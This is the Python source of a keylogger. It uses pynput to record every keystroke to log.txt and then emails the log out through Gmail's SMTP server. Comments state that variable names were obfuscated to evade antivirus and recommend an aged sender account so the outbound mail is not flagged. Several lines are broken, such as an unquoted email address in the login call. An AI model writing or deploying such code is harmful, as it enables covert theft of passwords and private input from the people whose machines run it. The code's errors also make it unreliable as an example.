from pynput.keyboard import Listener as A
import re as B
from flask import Flask as C, send_file as D
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

#Essentially the same script as v1, but a little more obfuscated to try to hide from AV. ie; variables like log_keystroke changed to E
#As well as the removal of Flask, replaced with Mime to receive the log.txt fully remote via email.
#May have trouble sending and receiving emails, it's best to used an aged account for sending so the SMTP connection request isn't seen as malicious. WIP

def E(F):
    F = str(F).replace("'", "")
    if F == 'Key.space':
        F = ' '
    if F == 'Key.shift_r':
        F = ''
    if F == "Key.enter":
        F = '\n'
    if B.match(r'[a-zA-Z0-9!@#$%^&*()\-_=+\[\]{}|\\:;"\'<>,.?/~`]', F):
        with open("log.txt", 'a') as G:
            G.write(F)

def H():
    with open("log.txt", 'r') as I:
        J = I.read()
    K = B.sub(r'[^a-zA-Z0-9!@#$%^&*()\-_=+\[\]{}|\\:;"\'<>,.?/~` \n]', '', J)
    with open("log.txt", 'a') as L:
        L.write(K)

def send_email():
    # Email configurations
    sender_email = "email@gmail.com"
    receiver_email = "email@gmail.com"
    subject = "Log File"
    body = "Please find the attached log file."

    # Create a multipart message and set the headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    # Add body to email
    message.attach(MIMEText(body, "plain"))

    # Open the file in bynary
    with open("log.txt", "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {'log.txt'}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    # Send email using Gmail SMTP server
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(email@gmail.com, "Password")
        server.sendmail(email@gmail.com, email@gmail.com, text)

with A(on_press=E) as M:
    M.join()

H()
send_email()
